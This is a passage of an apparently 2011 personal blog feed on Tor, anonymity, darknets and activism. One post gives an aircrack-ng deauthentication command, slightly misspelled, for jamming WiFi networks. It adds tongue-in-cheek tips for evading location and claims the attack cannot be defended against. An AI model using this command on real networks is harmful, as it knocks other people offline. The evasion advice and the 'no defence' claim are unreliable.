what is known as the &lt;a href="http://search.yahoo.com/r/_ylt=A0oGdVvgRwFOiBgA6eRXNyoA;_ylu=X3oDMTByZ3RtN3J1BHNlYwNzcgRwb3MDMgRjb2xvA3NrMQR2dGlkAw--/SIG=12kk6c8up/EXP=1308728384/**https%3A//db.usenix.org/events/leet11/tech/full_papers/LeBlond.pdf"&gt;Bad Apple Attack&lt;/a&gt; to discover your true IP
address. It is also possible for the baddies running a bad exit node to
alter your traffic, which is called &lt;a href="http://security-freak.net/packet-injection/packet-injection.html"&gt;packet injection&lt;/a&gt;. Those evil
baddies can also do other things, like phish for your passwords, spoof
webpages to steal credentials, etc. Long story short, it's a good idea
to avoid these nodes.&lt;/p&gt;
&lt;p&gt;Thankfully, there's a &lt;a href="http://en.wikipedia.org/wiki/.onion"&gt;.onion site&lt;/a&gt; (that means it's a &lt;a href="https://www.torproject.org/docs/hidden-services.html.en"&gt;Tor Hidden
Service&lt;/a&gt; -- a website hosted anonymously via the Tor network and only,
or &lt;a href="http://tor2web.org/"&gt;mostly only&lt;/a&gt;, viewable through Tor). So, with Tor running, direct
a new tab of your browser to &lt;a href="http://xqz3u5drneuzhaeo.onion/users/badtornodes/"&gt;InspecTor&lt;/a&gt;. Check the boxes for nodes
you want to exclude, depending on your level of paranoia. I'd recommend,
at bare minimum, checking the boxes for Known Bad Nodes, Nodes With
Strange Exit Policies, and Nodes Running Critical Versions of Tor. I'd
also recommend checking the box to identify nodes based on their
fingerprint. Click the button to generate the ExcludeNodes list. A new
page will come up with the list of nodes in a text box. Select all, and
copy.&lt;/p&gt;
&lt;p&gt;In the Vidalia GUI, click the Settings button, then navigate to the
Advanced tab. In the second box down, click the Edit Current Torrc
button. Paste the list of nodes to exclude from InspecTor into this
file, make sure the Apply All button is selected, and the Save Settings
box is checked. Hit OK.&lt;/p&gt;
&lt;p&gt;There you are. If you have &lt;a href="https://www.torproject.org/torbutton/"&gt;Torbutton&lt;/a&gt; installed in Firefox, you can
now surf the internet (pseudo)anonymously, without worrying about the
NSA and other baddies sniffing your traffic.&lt;/p&gt;
&lt;p&gt;If you have questions or problems, email me at
isis agora lovecruft(at)patternsinthevoid(dot)net, and I will do my best to help. My
public GPG key can be found [here][], if you wish to send me an
encrypted email. To head back to the Basic Security pages, &lt;a href="http://www.patternsinthevoid.net/security.html"&gt;click
here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;______________________________________________________________________________________&lt;/p&gt;
&lt;p&gt;Commands of General Help&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;lsb_release&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;                 &lt;span class="c1"&gt;//displays the codename of the running Ubuntu version$ /etc/debian_version            //displays the codename of the running Debian version$ ss -anl | grep 9050            //checks which service is running on a specific port,                                 //in this case, port:9050, the standard port for Tor$ sudo /etc/init.d/tor stop      //stops Tor$ sudo /etc/init.d/polipo stop   //stops Polipo$ sudo /etc/init.d/tor start     //starts Tor$ sudo /etc/init.d/polipo start  //starts Polipo$ sudo /etc/init.d/tor restart   //I think you get the idea$ sudo update-rc.d -f tor remove //removes all instances of Tor from the startup scripts&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;[here]: http://www.patternsinthevoid.net/isis agora lovecruft_pgp_public_key.html&lt;/p&gt;</summary><category term=".onion"></category><category term="anonymity"></category><category term="Bad Apple Attack"></category><category term="Excluding Bad Exit Nodes"></category><category term="linux"></category><category term="Polipo"></category><category term="Setting Up a Tor Relay"></category><category term="Tor"></category><category term="Tor Hidden Services"></category><category term="Vidalia"></category></entry><entry><title>Because It's Not The '90s Anymore</title><link href="/because-its-not-the-90s-anymore.html" rel="alternate"></link><updated>2011-06-17T20:26:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-06-17:because-its-not-the-90s-anymore.html</id><summary type="html">&lt;p&gt;[![][]][]&lt;/p&gt;
&lt;p&gt;Scan the barcode for my contact information.&lt;/p&gt;
&lt;p&gt;Setting up mass anonymous accounts which all reference each other for
verification is fun! Especially the part about getting the SIP account
to forward to a PSTN number to set up a Google Voice account. And I
didn't have to spend a dime -- take that, The Man!&lt;/p&gt;
&lt;p&gt;EDIT: I don't use most of these accounts, and some I have purposefully
shut down. Email is where it's at.&lt;/p&gt;
&lt;p&gt;[]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/isis agora lovecruft_qr_code.php_1-300x300.png
    "isis agora lovecruft_qr_code.php"
  [![][]]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/isis agora lovecruft_qr_code.php_1.png&lt;/p&gt;</summary><category term="anonymity"></category><category term="contact info"></category><category term="QR"></category><category term="security"></category></entry><entry><title>Well, Fuck Them: A Declaration of the Independence of Cyberspace</title><link href="/well-fuck-them-a-declaration-of-the-independence-of-cyberspace.html" rel="alternate"></link><updated>2011-06-10T01:35:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-06-10:well-fuck-them-a-declaration-of-the-independence-of-cyberspace.html</id><summary type="html">&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fuckthem.png" title="fuckthem" /&gt;][]My friend &lt;a href="https://humaniterations.wordpress.com/"&gt;William Gillis&lt;/a&gt; made a pretty zine out of "Well,
Fuck Them" an extract from &lt;a href="https://w2.eff.org/Censorship/Internet_censorship_bills/barlow_0296.declaration"&gt;a letter&lt;/a&gt; that &lt;a href="https://projects.eff.org/~barlow/"&gt;John Perry Barlow&lt;/a&gt;, of
the &lt;a href="https://www.eff.org/"&gt;Electronic Frontier Foundation&lt;/a&gt;, wrote in response to the
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Communications_Decency_Act"&gt;Communications Decency Act&lt;/a&gt; of 1996, which made it illegal to say
"fuck" online.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/well-fuck-them.pdf"&gt;Well, Fuck Them&lt;/a&gt;.pdf (zine, print format)&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fightthem.png" title="fightthem" /&gt;][]&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fuckthem.png" title="fuckthem" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fuckthem.png
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fightthem.png" title="fightthem" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/fightthem.png&lt;/p&gt;</summary><category term="anarchism"></category><category term="Communications Decency Act of 1996"></category><category term="crypto-anarchism"></category><category term="cyberliberation"></category><category term="cyberspace"></category><category term="Electronic Frontier Foundation"></category><category term="zines"></category><category term="fuck them"></category><category term="John Perry Barlow"></category><category term="William Gillis"></category></entry><entry><title>Neuromancer</title><link href="/neuromancer.html" rel="alternate"></link><updated>2011-05-11T21:21:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-05-11:neuromancer.html</id><summary type="html">&lt;p&gt;[caption id="attachment_656" align="aligncenter" width="594"
caption="Tree Map Output for Neuromancer, made by Jim
Blackhurst"][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/neuromancer.png" title="neuromancer" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;This audiobook is amazing, not simply for its content -- William
Gibson's Neuromancer is a wonderful book regardless -- but for its
narrator. I'm not sure who the narrator is, but they have a very
interesting voice. Specifically, they either have some strange accent, a
sort of cross between a British and Texan accent, or they have some
speech defect which I have never heard before. I'm going with the higher
probability of the latter being true. They often switch vowel types, so
that, for instance, a short "a" as in "anarchist" becomes long as in
"awesome". There appears to be no consistent pattern to it; they will
switch multiple vowels within one word and then none at all in the next.
I wish I knew who they were.&lt;/p&gt;
&lt;p&gt;I have listened to this book seven or eight times, and I feel like I
know the narrator now, as if they are some part of myself, some program
in my brain that I can access. I kind of want to upload this book to the
world as a reality check to make sure that I'm not hearing extra voices
reading me my favourite books, which is totally something my brain would
do.&lt;/p&gt;
&lt;p&gt;The files are after the jump to save screen space (there's 50 of them!)&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_1][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_2][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_3][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_4][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_5][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_6][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_7][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_8][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_9][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_10][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_11][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_12][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_13][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_14][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_15][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_16][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_17][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_18][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_19][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_20][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_21][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_22][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_23][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_24][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_25][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_26][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_27][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_28][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_29][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_30][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_31][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_32][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_33][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_34][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_35][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_36][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_36][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_37][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_38][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_39][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_40][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_41][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_42][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_43][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_44][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_45][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_46][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_47][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_48][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_49][]&lt;/p&gt;
&lt;p&gt;[William Gibson - Neuromancer_chunk_50][]&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/neuromancer.png" title="neuromancer" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/neuromancer.png&lt;/p&gt;</summary><category term="artificial intelligence"></category><category term="audiobook"></category><category term="jim blackhurst"></category><category term="neuromancer"></category><category term="speech defects"></category><category term="william gibson"></category><category term="wintermute"></category></entry><entry><title>Advanced Digital Security for Radicals Workshop</title><link href="/advanced-digital-security-for-radicals-workshop.html" rel="alternate"></link><updated>2011-05-09T18:51:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-05-09:advanced-digital-security-for-radicals-workshop.html</id><summary type="html">&lt;p&gt;Some friends of mine and I are going to do another community workshop on
the 29th of May at the Black Rose Infoshop. Here's the flyer!&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/hackzor-page1.png" title="advdigsecworkshopflyer" /&gt;][]&lt;/p&gt;
&lt;p&gt;![][1]&lt;/p&gt;
&lt;p&gt;The last workshop we did covered the basics: encrypting emails and chat,
and using Tor. This workshop will cover a teensy bit more advanced
topics, and it's leading up to the next one which will be on DDoSing
techniques and tools and online activism. If you missed the first
workshop, but feel reasonably comfortable with the basics, or you just
want to hang around and listen, you should stop by. Everyone's more than
welcome to attend -- our aim is to help our fellow activists regardless
of where they're at. Come on by, and bring your questions and computers!&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/hackzor-page1.png" title="advdigsecworkshopflyer" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/hackzor-page1.png
  [1]: file:///D:/isis agora lovecruft/Desktop/hackzor-page1.png&lt;/p&gt;</summary><category term="activism"></category><category term="anarchism"></category><category term="Black Rose"></category><category term="crypto-anarchism"></category><category term="cryptography"></category><category term="darknet"></category><category term="DDoS"></category><category term="encryption"></category><category term="freenet"></category><category term="i2p"></category><category term="plausible deniability"></category><category term="radicalism"></category><category term="security"></category><category term="steganography"></category><category term="Tor"></category><category term="virtual machines"></category><category term="virtual private network"></category></entry><entry><title>Schizophrenic Artificial Intelligences</title><link href="/schizophrenic-artificial-intelligences.html" rel="alternate"></link><updated>2011-05-09T10:05:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-05-09:schizophrenic-artificial-intelligences.html</id><summary type="html">&lt;p&gt;&lt;a href="http://www.utexas.edu/news/2011/05/05/schizophrenia_discern/"&gt;Scientists&lt;/a&gt; have modeled a neural network to display
schizophrenic-like language abnormalities by decreasing the information
resilience function, essentially telling the network not to forget as
much of what it's taught.&lt;/p&gt;
&lt;p&gt;From &lt;a href="http://www.kurzweilai.net/virtual-schizophrenia"&gt;KurzweilAI&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"The researchers taught a series of simple stories to a neural network
programmed to learn and answer questions about narratives, though with
an imperfect memory. When they decreased the program’s ability to
forget, it started giving answers resembling those given by humans
with schizophrenia.&lt;/p&gt;
&lt;p&gt;The answers contained dissociated sentences, digressions, and
delusions—at one point the computer claimed responsibility for a
terrorist bombing. Answers also typically included incoherent jumbles
of elements from the various stories it had been taught."&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I don't think I can even begin to emphasize how much I long for that
source code. A robot programmed just like me! \&amp;lt;3 Oh, and, speaking of
adorable robot-type-entities, thanks to &lt;a href="https://humaniterations.wordpress.com/"&gt;William&lt;/a&gt; for reading me that
news article.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/lisp.jpg" title="lisp from xkcd" /&gt;][]&lt;/p&gt;
&lt;p&gt;Excuse my incessant xkcd references.&lt;/p&gt;
&lt;p&gt;So, now for the serious stuff. I scanned another book today: &lt;em&gt;Linguistic
Fuzzy Logic Methods in Social Sciences&lt;/em&gt; by Badredine Arfi. Linguistic
fuzzy logic is used for all sorts of awesome things, including
programming neural networks. This book includes applications to the
&lt;a href="http://www.patternsinthevoid.net/blog/2011/01/game-theory-anarchism-why-snitches-are-snitches-and-why-anarchists-are-not-snitches/"&gt;Prisoner's Dilemma in Game Theory&lt;/a&gt;, and &lt;a href="https://markweatherall.wordpress.com/2009/11/30/states_and_social_revolutions/"&gt;Skocpol's Theory of
Revolution&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linguistic Fuzzy Logic Methods in Social Sciences&lt;/strong&gt; (click for .pdfs)&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/00-Front-Cover.pdf"&gt;Front Cover.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/01-Forewards-Prefaces-and-ToC.pdf"&gt;Forewards, Prefaces, and ToC.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/02-Chapter-1-Linguistic-Fuzzy-Logic-and-Computing-with-Words.pdf"&gt;Chapter 1 - Linguistic Fuzzy-Logic and Computing with Words.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/03-Chapter-2-Elements-of-Linguistic-Fuzzy-Logic-and-Framework.pdf"&gt;Chapter 2 - Elements of Linguistic Fuzzy-Logic and Framework.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/04-Chapter-3-Linguistic-Fuzzy-Logic-Decision-Making-Process.pdf"&gt;Chapter 3 - Linguistic Fuzzy-Logic Decision-Making Process.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/05-Chapter-4-Linguistic-Fuzzy-Logic-2x2-Games.pdf"&gt;Chapter 4 - Linguistic Fuzzy-Logic 2x2 Games.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/06-Chapter-5-Linguistic-Fuzzy-Logic-Social-Game.pdf"&gt;Chapter 5 - Linguistic Fuzzy-Logic Social Game.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/07-Chapter-6-Linguistic-Fuzzy-Logic-and-Causality.pdf"&gt;Chapter 6 - Linguistic Fuzzy-Logic and Causality.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/08-Chapter-7-Linguistic-Fuzzy-Logic-Data-Analysis.pdf"&gt;Chapter 7 - Linguistic Fuzzy-Logic Data Analysis.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/09-Chapter-8-Conclusion.pdf"&gt;Chapter 8 - Conclusion.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/10-References.pdf"&gt;References.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/11-Back-Cover.pdf"&gt;Back Cover.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/lisp.jpg" title="lisp from xkcd" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/05/lisp.jpg&lt;/p&gt;</summary><category term="artificial intelligence"></category><category term="badredine arfi"></category><category term="causality"></category><category term="computing with words"></category><category term="data analysis"></category><category term="fuzzy logic"></category><category term="game theory"></category><category term="linguistic fuzzy logic"></category><category term="linguistics"></category><category term="neural nets"></category><category term="prisonner's dilemma"></category><category term="revolution"></category><category term="schizophrenia"></category><category term="theda skocpol"></category></entry><entry><title>Broadcast De-auth DOS Attack: Jamming WiFi Networks</title><link href="/broadcast-de-auth-dos-attack-jamming-wifi-networks.html" rel="alternate"></link><updated>2011-05-07T13:52:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-05-07:broadcast-de-auth-dos-attack-jamming-wifi-networks.html</id><summary type="html">&lt;p&gt;The following may or may not be illegal to practice on networks not
owned by the broadcaster. As such, it is purely for informational and
educational purposes.&lt;/p&gt;
&lt;p&gt;I'm certainly not the first to discover this, by any means. It's
incredibly simple, and there's no way to defend against it. This type of
attack uses aireplay-ng to broadcast streaming de-authorization packets
to any client on a given wireless network, or networks. Put simply, it
effectively "jams" WiFi networks. If you're within radio range of the
network access point, you stream the de-auth packets to boot everyone
off the network. If you keep streaming this, it becomes a Denial of
Service attack because they can't reconnect to the network while you're
jamming it.&lt;/p&gt;
&lt;p&gt;To do this, you need a wireless card which supports packet injection and
monitoring, and simply the aircrack-ng suite of tools. The command for
it is&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="n"&gt;airplay&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ng&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;death&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;BSSID&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;victim&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;access&lt;/span&gt; &lt;span class="n"&gt;point&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;mon0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There's no way to defend against this type of attack, but the victim(s)
could triangulate your position using the frequency strength of your
broadcast. So, if you're going to do this, use rollerskates.&lt;/p&gt;</summary><category term="DOS"></category><category term="packet injection"></category><category term="wifi jamming"></category></entry><entry><title>Censorship</title><link href="/censorship.html" rel="alternate"></link><updated>2011-04-19T02:13:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-04-19:censorship.html</id><summary type="html">&lt;p&gt;My ISP just censored port 25 for my account, blocking all standard
outgoing SMTP connections. Meaning, no outgoing email from any accounts
that aren't going directly through their server. I've already found a
workaround. I can't believe they just tried to do that. What. The. Fuck.
You guys are assholes and I'm going to figure out how
to...yeah...nevermind. *shakes fist*&lt;/p&gt;</summary></entry><entry><title>Some Ideas For Darknet Implementation, Encryption, and Integration</title><link href="/some-ideas-for-darknet-implementation-encryption-and-integration.html" rel="alternate"></link><updated>2011-04-05T23:19:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-04-05:some-ideas-for-darknet-implementation-encryption-and-integration.html</id><summary type="html">&lt;p&gt;Notes on Reading [Private Communication Through a Network of Trusted
Connections: The Dark Freenet][] (click for .pdf)&lt;/p&gt;
&lt;p&gt;I learned that data encryption within a Freenet (not necessarily dark)
is often restricted to two types: CHKs and SSKs (6). As a basic measure
against profiling and traffic analysis, documents are relegated to set
sizes -- 32kb for CHKs (Content Hash Key, a type of symmetric
cryptographic key generation in which the data includes the means of
generating the key) and 1kb for SSKs (Signed Subspace Key, i.e. ain
information publisher has an asymmetric key-pair used to sign documents
within a free(/dark)net subspace. Any larger documents are split up into
smaller ones to maintain this size imperative. Also, as anyone who has
used any type of P2P net has experienced, search functions within the
network are limited, but I just learned the reason why: directories
aren't plaintext, but are (usually) MD5 hashes of locations. So, unless
you know the precise location of the document or information you're
trying to access, and thus can generate the matching MD5 hash, you can't
even discover that the directory is there. Kind of like how you can't
access an .onion site unless you already know the address. This was
making my brain itch a little bit, but I'm good now.&lt;/p&gt;
&lt;p&gt;Fuzzy Logic Operations within Computerized Social Networks applied to
Darknet Operations:[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/04/darknet-2.jpg" title="darknet 2" /&gt;][]&lt;/p&gt;
&lt;p&gt;"Instead [of Stanley Milgram's small-world model], we use a method which
draws off the small world models of Jon Kleinberg. The routing we
perform is purely greedy: at each step, the desirability of the
neighbors is ordered by the proximity of their identities to the route
key K (seen as floating point number between 0 and 1 with periodic
boundary). The question then becomes one of trying affect the randomized
assignment of identities such that this becomes an efficient way of
routing. For routing to be efficient Kleinberg’s results show that
certain relation between the frequency of connections of different
lengths (with respect to the identities) must be present, so our goal is
to, to the degree that it is possible, assign identities so that this
holds. The method we have chosen for doing this is a development of that
described in ["Distributed routing in small-world networks" by O.
Sandberg]." (7)&lt;/p&gt;
&lt;p&gt;Basically, the propinquity of your friend Miss X to her friend Sir Y's
node which contains the data you're attempting to access, this proximity
is systematized via a fuzzy logic operator which outputs between a range
of [0,1], 0 representing no connections to the desired node, and 1
representing the desired node. Thus, an informational subgraph is
overlayed onto the subgraph of the world's social network which contains
the portion of your social network connected to the darknet.&lt;/p&gt;
&lt;p&gt;[caption id="" align="alignleft" width="450" caption="Fuzzy Logic
Explained!"][&lt;img alt="" src="http://imgs.xkcd.com/comics/cat_proximity.png" title="http://xkcd.com/231/" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;Sorry for the fuzzy logic geek out...I thought it was a cool application
in informational network analysis.&lt;/p&gt;
&lt;p&gt;"In our implementation nodes start upon joining the network with
randomly selected identities seen as numbers between 0 and 1. These
identities are then switched between the nodes using the simulated
annealing like method first explored in [29], which causes nodes that
are in some sense close in the network topology to also have nearby
identities. (It is only when this property holds that greedy routing
makes sense in anything but the final step.) The use of random
positions, rather than fixed points in a grid, makes our model slightly
different than the Kleinberg model that is the basis of previous
analysis of this method, but similar continuum models have been
previously studied in [15] and [14]. Nodes at a constant rate initiate
random walks, which terminate after a fixed number of steps (current
six, which simulation indicates is enough even in a large network). When
the walk terminates, the node at which it was started and that at which
it ended attempt to switch identities, which will happen with a
probability specified by the algorithm. Ideally, one would hope to be
able to assign the identities so that every step in a route for K brings
us to a node whose identity is closer to K than the last, until we have
found the best node on the network. In practice, this may not always be
possible, but we still use this as heuristic to show us when to
terminate a route. Currently the route continues until it has reached a
maximal Hops-To-Live (HTL), which is motivated by attempting to balance
a thorough search while limiting resource usage." (7-8)&lt;/p&gt;
&lt;p&gt;"Several enhancements to the basic algorithm described in [29] which
could lead to better results have been suggested. Knowing the identity
of ones neighbors’ neighbors is known to improve the performance of
routing in Kleinberg type networks [24] by allowing nodes to route to
the neighbor whose neighbors identities best match the query. Knowing
the identities of neighbor’s neighbors reveals something about the
surrounding network, but does not tell one who they are, so the basic
principle of only revealing oneself to trusted peers remains. Another
performance enhancement that we use is for nodes to be aware of which
documents are present in their neighbor’s cache, by for instance
neighbors passing Bloom filters [4] summarizing the contents of their
cache to each other. A combination of both these techniques can greatly
increase the number of successful searches and decrease the query
length." (8)&lt;/p&gt;
&lt;p&gt;One enhancement to this system which I can conceive of would be the
application of hash tags to identities. For instance, when searching on
the darknet for a document, e.g. Kropotkin's Conquest of Bread, your
node would analyze the hash tags of your friends' friends identities
according to the likelihood of them having the document. So, for
instance, you're searching for Conquest of Bread, and you route on the
darknet to your friend Miss X's node. Miss X has two friends on the
darknet, whose identities are invisible to you, but the hash tag
descriptions of them are not. One of these friends has a tag identifying
them as a Democrat, meaning the likelihood of their node containing the
Conquest of Bread is low, say a 5% chance, and so they have an assigned
value of .05 . Miss X's other friend is an Anarchist, and so their
likelihood is high, say 80%, and so they have a value of .80. Now I
realise that the data stored on your node is not directly determined by
you, but by what information is most commonly accessed on the darknet.
However, there should still be some way to either 1) control what data
is stored, or 2) apply hash tags for the type of data which has been
pseudo-randomly stored. I'm not in a position to be creating a darknet
right now, so anyone wanting to use this idea (if it's even at all
feasible) should feel welcome to do so.&lt;/p&gt;
&lt;p&gt;Alright, I read further and realized I'm behind on the times. A very
similar idea has already been implemented, called sinkstoring: "...each
node keeps two seperate caches of data. One is a short term cache where
all data that the node transfers is stored temporarily until it pushed
out by other data. The other is meant to keep data longer by storing
only inserted data that matches the nodes identity. The strategy used to
populate this second cache, which we have dubbed sinkstore, is this: A
node will attempt to place the document corresponding to a key K in its
store if it is better located at the node, given its identity, than to
that of any of its neighbors. For example, in the configuration shown in
Figure 1, the node with identity 0.49 is a sink for K = 0.50: its
current identity is closer to that value than any of its neighbors
identities - if the query was an insert, the node with current identity
0.49 would store it." (8)&lt;/p&gt;
&lt;p&gt;One of the problems with darknets is the availabilty of trusted peers to
new users. If each new user only knew one person already connected to
the darknet, the resulting network would take on a tree formation, and
the routing process would fail entirely. A possible solution to this
could be integration of darknets with emerging decentralized social
networking platforms, such as Appleseed and Diaspora, so that when users
sign up for an account on the social network they are automatically
integrated with a darknet system. If this were applied, new users
shouldn't have trouble connecting to multiple trusted peers. Again,
